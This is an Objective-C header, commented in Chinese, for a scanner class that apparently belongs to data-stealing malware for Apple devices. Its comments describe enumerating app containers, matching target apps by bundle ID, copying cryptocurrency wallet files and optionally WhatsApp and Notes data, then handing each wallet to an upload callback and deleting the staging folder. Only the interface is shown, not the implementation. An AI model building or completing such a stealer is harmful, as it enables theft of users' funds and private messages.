#import <Foundation/Foundation.h>
#import "WQLTargets.h"

NS_ASSUME_NONNULL_BEGIN

/// 采集流程：枚举容器 → 反查 bundleID → 命中目标则取 extension → 拷贝文件
@interface WQLScanner : NSObject

/// inode 扫描上界，0 = 用基线自动取
@property (nonatomic, assign) uint64_t maxInode;

/// 单容器/单目录拷贝门限，默认 800MB
@property (nonatomic, assign) uint64_t maxContainerBytes;

/// 是否把 extras（WhatsApp / 备忘录）也一起带走
@property (nonatomic, assign) BOOL includeExtras;

/// 日志回调（任意线程）
@property (nonatomic, copy, nullable) void (^logBlock)(NSString *line);

/// 返回 YES 则中止
@property (nonatomic, copy, nullable) BOOL (^cancelBlock)(void);

/// 每采到一个钱包立刻回调：参数是待打包目录（含 _manifest.json）。
/// 由调用方负责打包上传，回调返回后该目录会被删除。
@property (nonatomic, copy, nullable) void (^uploadBlock)(NSString *stagingDir, NSString *walletName);

/// 默认根目录
- (NSArray<NSString *> *)defaultRoots;

/// 主流程。返回每个容器的记录字典：bundleId / path / target / status / files / bytes
- (NSArray<NSDictionary<NSString *, id> *> *)scanWithOutputDirectory:(NSString *)outDir;

@end

NS_ASSUME_NONNULL_END
